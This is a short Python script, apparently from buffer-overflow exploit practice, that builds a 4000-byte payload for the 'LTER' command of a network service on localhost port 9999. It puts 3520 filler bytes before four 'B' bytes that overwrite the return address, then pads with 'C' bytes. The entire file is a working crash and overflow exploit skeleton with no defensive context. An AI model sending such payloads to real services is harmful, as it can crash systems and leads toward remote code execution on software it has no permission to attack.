import socket
import os
import sys

vuln_command = "LTER _.?"
crash = 4000
offset = 3520

payload = ""
payload += vuln_command
payload += "A" * offset
payload += "B" * 4
payload += "C" * (crash - 4 - offset)

print "[+] Sending buffer (Size: %d)" % len(payload)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('127.0.0.1', 9999))
print(s.recv(1024))
s.send(payload)
s.close()
